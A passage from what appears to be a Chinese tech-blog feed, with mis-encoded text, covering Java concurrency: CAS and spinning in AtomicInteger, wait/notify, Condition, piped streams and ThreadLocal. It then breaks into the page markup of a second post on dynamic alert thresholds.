                (AtomicInteger.class.getDeclaredField(<span class="hljs-string">"value"</span>));
        } <span class="hljs-keyword">catch</span> (Exception ex) { <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(ex); }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> value; <span class="hljs-comment">// ä½¿ç”¨volatileä¿è¯å¯è§æ€§</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
        <span class="hljs-comment">// ä½¿ç”¨CASæ“ä½œåŸå­åœ°æ›´æ–°valueå­—æ®µ</span>
        <span class="hljs-keyword">return</span> unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, valueOffset, expect, update);
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨<code>objectFieldOffset</code>è·å–å­—æ®µåç§»é‡</li>
<li>ä½¿ç”¨<code>compareAndSwapInt</code>è¿›è¡ŒCASæ“ä½œ</li>
<li>valueå­—æ®µä½¿ç”¨volatileä¿è¯å¯è§æ€§</li>
</ul>
<h4 data-id="heading-214">è‡ªæ—‹æœºåˆ¶</h4>
<p><strong>CASå¤±è´¥åä¼šè‡ªæ—‹é‡è¯•ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªæ—‹å®ç°ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">incrementAndGet</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> current;
    <span class="hljs-type">int</span> next;
    <span class="hljs-keyword">do</span> {
        current = get();        <span class="hljs-comment">// 1. è·å–å½“å‰å€¼</span>
        next = current + <span class="hljs-number">1</span>;     <span class="hljs-comment">// 2. è®¡ç®—æ–°å€¼</span>
        <span class="hljs-comment">// 3. CASå°è¯•æ›´æ–°ï¼Œå¦‚æœå¤±è´¥åˆ™è‡ªæ—‹é‡è¯•</span>
    } <span class="hljs-keyword">while</span> (!compareAndSet(current, next));
    <span class="hljs-keyword">return</span> next;
}
</code></pre>
<p><strong>è‡ªæ—‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>é¿å…çº¿ç¨‹é˜»å¡å’Œå”¤é†’çš„å¼€é”€</li>
<li>åœ¨ä½ç«äº‰åœºæ™¯ä¸‹æ€§èƒ½å¥½</li>
</ul>
<p><strong>è‡ªæ—‹çš„é—®é¢˜ï¼š</strong></p>
<ul>
<li>é«˜ç«äº‰åœºæ™¯ä¸‹ä¼šæµªè´¹CPU</li>
<li>å¯èƒ½å¯¼è‡´CPUä½¿ç”¨ç‡100%</li>
</ul>
<p><strong>ä¼˜åŒ–ç­–ç•¥ï¼š</strong></p>
<ul>
<li>JDK 8+æä¾›äº†LongAdderç­‰ç´¯åŠ å™¨ï¼Œä½¿ç”¨åˆ†æ®µé”å‡å°‘ç«äº‰</li>
<li>é«˜ç«äº‰æ—¶å¯ä»¥ä½¿ç”¨synchronized</li>
</ul>
<hr/>
<h2 data-id="heading-215">ç¬¬åç«  çº¿ç¨‹é—´é€šä¿¡</h2>
<h3 data-id="heading-216">10.1 wait/notify/notifyAll</h3>
<h4 data-id="heading-217">Object.wait()æ–¹æ³•</h4>
<p><strong>wait()æ–¹æ³•ä½¿å½“å‰çº¿ç¨‹è¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œç›´åˆ°è¢«å…¶ä»–çº¿ç¨‹å”¤é†’ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

<span class="hljs-comment">// ç­‰å¾…</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.wait();  <span class="hljs-comment">// é‡Šæ”¾é”ï¼Œè¿›å…¥ç­‰å¾…çŠ¶æ€</span>
}

<span class="hljs-comment">// å”¤é†’</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.notify();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹</span>
}
</code></pre>
<p><strong>wait()çš„è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å¿…é¡»åœ¨synchronizedå—ä¸­è°ƒç”¨</li>
<li>è°ƒç”¨wait()ä¼šé‡Šæ”¾é”</li>
<li>çº¿ç¨‹è¿›å…¥WAITINGçŠ¶æ€</li>
<li>è¢«å”¤é†’åéœ€è¦é‡æ–°è·å–é”æ‰èƒ½ç»§ç»­æ‰§è¡Œ</li>
</ul>
<p><strong>wait()çš„é‡è½½æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">lock.wait();                      <span class="hljs-comment">// æ— é™æœŸç­‰å¾…</span>
lock.wait(<span class="hljs-number">1000</span>);                  <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šæ—¶é—´ï¼ˆæ¯«ç§’ï¼‰</span>
lock.wait(<span class="hljs-number">1000</span>, <span class="hljs-number">500000</span>);         <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šæ—¶é—´ï¼ˆæ¯«ç§’+çº³ç§’ï¼‰</span>
</code></pre>
<h4 data-id="heading-218">Object.notify()æ–¹æ³•</h4>
<p><strong>notify()æ–¹æ³•å”¤é†’åœ¨æ­¤å¯¹è±¡ç›‘è§†å™¨ä¸Šç­‰å¾…çš„å•ä¸ªçº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-comment">// ç­‰å¾…æ¡ä»¶</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {  <span class="hljs-comment">// ä½¿ç”¨whileï¼Œé˜²æ­¢è™šå‡å”¤é†’</span>
        lock.wait();
    }
    <span class="hljs-comment">// æ¡ä»¶æ»¡è¶³ï¼Œæ‰§è¡Œä»»åŠ¡</span>
}

<span class="hljs-comment">// è®¾ç½®æ¡ä»¶</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    condition = <span class="hljs-literal">true</span>;
    lock.notify();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
}
</code></pre>
<p><strong>notify()çš„è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å¿…é¡»åœ¨synchronizedå—ä¸­è°ƒç”¨</li>
<li>åªèƒ½å”¤é†’åœ¨æ­¤å¯¹è±¡ä¸Šwait()çš„çº¿ç¨‹</li>
<li>å¦‚æœæœ‰å¤šä¸ªçº¿ç¨‹åœ¨ç­‰å¾…ï¼Œéšæœºå”¤é†’ä¸€ä¸ª</li>
<li>è¢«å”¤é†’çš„çº¿ç¨‹éœ€è¦é‡æ–°è·å–é”</li>
</ul>
<h4 data-id="heading-219">Object.notifyAll()æ–¹æ³•</h4>
<p><strong>notifyAll()æ–¹æ³•å”¤é†’åœ¨æ­¤å¯¹è±¡ç›‘è§†å™¨ä¸Šç­‰å¾…çš„æ‰€æœ‰çº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.notifyAll();  <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹</span>
}
</code></pre>
<p><strong>notify() vs notifyAll()ï¼š</strong></p>

























<table><thead><tr><th>ç‰¹æ€§</th><th>notify()</th><th>notifyAll()</th></tr></thead><tbody><tr><td><strong>å”¤é†’æ•°é‡</strong></td><td>1ä¸ªçº¿ç¨‹</td><td>æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>æ‰€æœ‰ç­‰å¾…çº¿ç¨‹å¤„ç†ç›¸åŒçš„ä»»åŠ¡</td><td>ç­‰å¾…çº¿ç¨‹å¤„ç†ä¸åŒçš„ä»»åŠ¡</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>æ›´å¥½ï¼ˆåªå”¤é†’ä¸€ä¸ªï¼‰</td><td>è¾ƒå·®ï¼ˆå”¤é†’æ‰€æœ‰ï¼‰</td></tr></tbody></table>
<h4 data-id="heading-220">ä½¿ç”¨æ³¨æ„äº‹é¡¹</h4>
<p><strong>1. å¿…é¡»åœ¨synchronizedå—ä¸­è°ƒç”¨</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šä¼šæŠ›å‡ºIllegalMonitorStateException</span>
lock.wait();

<span class="hljs-comment">// âœ… æ­£ç¡®</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.wait();
}
</code></pre>
<p><strong>2. ä½¿ç”¨whileå¾ªç¯æ£€æŸ¥æ¡ä»¶ï¼ˆé˜²æ­¢è™šå‡å”¤é†’ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šå¯èƒ½äº§ç”Ÿè™šå‡å”¤é†’</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">if</span> (!condition) {
        lock.wait();
    }
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨whileå¾ªç¯</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {
        lock.wait();
    }
}
</code></pre>
<p><strong>3. æ³¨æ„é”çš„æŒæœ‰æ—¶é—´</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šæŒæœ‰é”æ—¶é—´è¿‡é•¿</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    heavyOperation();  <span class="hljs-comment">// è€—æ—¶æ“ä½œ</span>
    lock.wait();
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šåœ¨é”å¤–æ‰§è¡Œè€—æ—¶æ“ä½œ</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {
        lock.wait();
    }
}
heavyOperation();  <span class="hljs-comment">// åœ¨é”å¤–æ‰§è¡Œ</span>
</code></pre>
<h4 data-id="heading-221">è™šå‡å”¤é†’é—®é¢˜</h4>
<p><strong>è™šå‡å”¤é†’ï¼š</strong> çº¿ç¨‹å¯èƒ½åœ¨æ²¡æœ‰è°ƒç”¨notify()çš„æƒ…å†µä¸‹è¢«å”¤é†’ã€‚</p>
<p><strong>åŸå› ï¼š</strong> æ“ä½œç³»ç»Ÿå±‚é¢çš„ä¿¡å·ã€å…¶ä»–ç³»ç»Ÿè°ƒç”¨ã€JVMå®ç°ç»†èŠ‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨whileå¾ªç¯è€Œä¸æ˜¯if</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {  <span class="hljs-comment">// ä½¿ç”¨whileï¼Œè¢«å”¤é†’åå†æ¬¡æ£€æŸ¥</span>
        lock.wait();
    }
    <span class="hljs-comment">// æ¡ä»¶æ»¡è¶³ï¼Œæ‰§è¡Œä»»åŠ¡</span>
}
</code></pre>
<h3 data-id="heading-222">10.2 Conditionæœºåˆ¶</h3>
<h4 data-id="heading-223">Condition.await()</h4>
<p><strong>Conditionæä¾›äº†æ›´çµæ´»çš„ç­‰å¾…/é€šçŸ¥æœºåˆ¶ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> lock.newCondition();

<span class="hljs-comment">// ç­‰å¾…</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.await();  <span class="hljs-comment">// é‡Šæ”¾é”å¹¶ç­‰å¾…</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}

<span class="hljs-comment">// å”¤é†’</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signal();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>await()çš„é‡è½½æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">condition.await();                                    <span class="hljs-comment">// æ— é™æœŸç­‰å¾…</span>
condition.awaitNanos(<span class="hljs-number">1000000</span>);                       <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šçº³ç§’</span>
condition.await(<span class="hljs-number">1</span>, TimeUnit.SECONDS);               <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šæ—¶é—´</span>
condition.awaitUntil(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());                    <span class="hljs-comment">// ç­‰å¾…åˆ°æŒ‡å®šæ—¥æœŸ</span>
condition.awaitUninterruptibly();                    <span class="hljs-comment">// ä¸å“åº”ä¸­æ–­</span>
</code></pre>
<h4 data-id="heading-224">Condition.signal()</h4>
<p><strong>signal()å”¤é†’ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signal();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-225">Condition.signalAll()</h4>
<p><strong>signalAll()å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signalAll();  <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-226">å¤šä¸ªConditionçš„ä½¿ç”¨</h4>
<p><strong>Conditionçš„ä¼˜åŠ¿ï¼šå¯ä»¥ä¸ºä¸åŒçš„æ¡ä»¶åˆ›å»ºä¸åŒçš„Conditionã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();  <span class="hljs-comment">// ä¸ç©ºæ¡ä»¶</span>
<span class="hljs-type">Condition</span> <span class="hljs-variable">notFull</span> <span class="hljs-operator">=</span> lock.newCondition();   <span class="hljs-comment">// ä¸æ»¡æ¡ä»¶</span>

<span class="hljs-comment">// ç”Ÿäº§è€…ï¼šç­‰å¾…ä¸æ»¡æ¡ä»¶ï¼Œé€šçŸ¥ä¸ç©ºæ¡ä»¶</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">while</span> (count == items.length)
        notFull.await();
    <span class="hljs-comment">// ç”Ÿäº§...</span>
    notEmpty.signal();  <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}

<span class="hljs-comment">// æ¶ˆè´¹è€…ï¼šç­‰å¾…ä¸ç©ºæ¡ä»¶ï¼Œé€šçŸ¥ä¸æ»¡æ¡ä»¶</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>)
        notEmpty.await();
    <span class="hljs-comment">// æ¶ˆè´¹...</span>
    notFull.signal();  <span class="hljs-comment">// é€šçŸ¥ç”Ÿäº§è€…</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>æ›´ç²¾ç¡®çš„çº¿ç¨‹å”¤é†’æ§åˆ¶</li>
<li>é¿å…ä¸å¿…è¦çš„å”¤é†’</li>
<li>æé«˜æ€§èƒ½</li>
</ul>
<h3 data-id="heading-227">10.3 ç®¡é“é€šä¿¡</h3>
<h4 data-id="heading-228">PipedInputStream/PipedOutputStream</h4>
<p><strong>ç®¡é“ç”¨äºçº¿ç¨‹é—´çš„å­—èŠ‚æµé€šä¿¡ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">PipedInputStream</span> <span class="hljs-variable">pis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedInputStream</span>();
<span class="hljs-type">PipedOutputStream</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedOutputStream</span>();
pis.connect(pos);  <span class="hljs-comment">// è¿æ¥è¾“å…¥è¾“å‡ºæµ</span>

<span class="hljs-comment">// ç”Ÿäº§è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    pos.write(<span class="hljs-string">"æ•°æ®"</span>.getBytes());
    pos.close();
}).start();

<span class="hljs-comment">// æ¶ˆè´¹è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span> data;
    <span class="hljs-keyword">while</span> ((data = pis.read()) != -<span class="hljs-number">1</span>) {
        System.out.print((<span class="hljs-type">char</span>) data);
    }
    pis.close();
}).start();
</code></pre>
<h4 data-id="heading-229">PipedReader/PipedWriter</h4>
<p><strong>ç®¡é“ç”¨äºçº¿ç¨‹é—´çš„å­—ç¬¦æµé€šä¿¡ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">PipedReader</span> <span class="hljs-variable">pr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedReader</span>();
<span class="hljs-type">PipedWriter</span> <span class="hljs-variable">pw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedWriter</span>();
pr.connect(pw);  <span class="hljs-comment">// è¿æ¥è¯»å†™å™¨</span>

<span class="hljs-comment">// ç”Ÿäº§è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    pw.write(<span class="hljs-string">"æ¶ˆæ¯"</span>);
    pw.close();
}).start();

<span class="hljs-comment">// æ¶ˆè´¹è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span> data;
    <span class="hljs-keyword">while</span> ((data = pr.read()) != -<span class="hljs-number">1</span>) {
        System.out.print((<span class="hljs-type">char</span>) data);
    }
    pr.close();
}).start();
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>ç®¡é“æ˜¯é˜»å¡çš„ï¼Œå¦‚æœç¼“å†²åŒºæ»¡ï¼Œå†™æ“ä½œä¼šé˜»å¡</li>
<li>å¦‚æœç¼“å†²åŒºç©ºï¼Œè¯»æ“ä½œä¼šé˜»å¡</li>
<li>é€‚åˆä¸€å¯¹ä¸€çš„çº¿ç¨‹é€šä¿¡</li>
</ul>
<h3 data-id="heading-230">10.4 çº¿ç¨‹é—´æ•°æ®å…±äº«</h3>
<h4 data-id="heading-231">ThreadLocal</h4>
<p><strong>ThreadLocalä¸ºæ¯ä¸ªçº¿ç¨‹æä¾›ç‹¬ç«‹çš„å˜é‡å‰¯æœ¬ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">ThreadLocal&lt;Integer&gt; threadLocal = ThreadLocal.withInitial(() -&gt; <span class="hljs-number">0</span>);

<span class="hljs-comment">// æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å‰¯æœ¬</span>
<span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> threadLocal.get();
threadLocal.set(value + <span class="hljs-number">1</span>);
threadLocal.remove();  <span class="hljs-comment">// ä½¿ç”¨å®Œåè®°å¾—ç§»é™¤ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼</span>
</code></pre>
<p><strong>ThreadLocalçš„åº”ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>ç”¨æˆ·ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼ˆç”¨æˆ·IDã€æƒé™ç­‰ï¼‰</li>
<li>æ•°æ®åº“è¿æ¥</li>
<li>æ—¥æœŸæ ¼å¼åŒ–å™¨</li>
<li>é¿å…å‚æ•°ä¼ é€’</li>
</ul>
<h4 data-id="heading-232">InheritableThreadLocal</h4>
<p><strong>InheritableThreadLocalå…è®¸å­çº¿ç¨‹ç»§æ‰¿çˆ¶çº¿ç¨‹çš„ThreadLocalå€¼ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">InheritableThreadLocal&lt;String&gt; threadLocal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InheritableThreadLocal</span>&lt;&gt;();

threadLocal.set(<span class="hljs-string">"çˆ¶çº¿ç¨‹çš„å€¼"</span>);

<span class="hljs-type">Thread</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-comment">// å­çº¿ç¨‹å¯ä»¥è®¿é—®çˆ¶çº¿ç¨‹çš„å€¼</span>
    System.out.println(threadLocal.get());
});
child.start();
</code></pre>
<h4 data-id="heading-233">çº¿ç¨‹é—´æ•°æ®ä¼ é€’</h4>
<p><strong>æ–¹å¼1ï¼šé€šè¿‡æ„é€ æ–¹æ³•ä¼ é€’</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">"æ•°æ®1"</span>;
    <span class="hljs-comment">// å¤„ç†æ•°æ®</span>
}).start();
</code></pre>
<p><strong>æ–¹å¼2ï¼šé€šè¿‡å…±äº«å˜é‡ä¼ é€’</strong></p>
<pre><code class="hljs language-java" lang="java">BlockingQueue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; queue.put(<span class="hljs-string">"æ•°æ®"</span>)).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; queue.take()).start();
</code></pre>
<p><strong>æ–¹å¼3ï¼šé€šè¿‡å›è°ƒå‡½æ•°ä¼ é€’</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> processData();
    callback.onComplete(result);
}).start();
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŠ¨æ€é˜ˆå€¼ï¼šè®©å‘Šè­¦ç³»ç»Ÿå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„æ·±åº¦å®è·µ]]></title>    <link>https://juejin.cn/post/7592451588848156691</link>    <guid>https://juejin.cn/post/7592451588848156691</guid>    <pubDate>2026-01-08T01:23:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588848156691" data-draft-id="7592088192517046315" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŠ¨æ€é˜ˆå€¼ï¼šè®©å‘Šè­¦ç³»ç»Ÿå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„æ·±åº¦å®è·µ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T01:23:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Ericinfra"/> <meta itemprop="url" content="https://juejin.cn/user/673352553084029"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŠ¨æ€é˜ˆå€¼ï¼šè®©å‘Šè­¦ç³»ç»Ÿå…·å¤‡è‡ªæˆ‘å­¦ä¹ èƒ½åŠ›çš„æ·±åº¦å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/673352553084029/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Ericinfra
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:23:47.000Z" title="Thu Jan 08 2026 01:23:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»30åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body 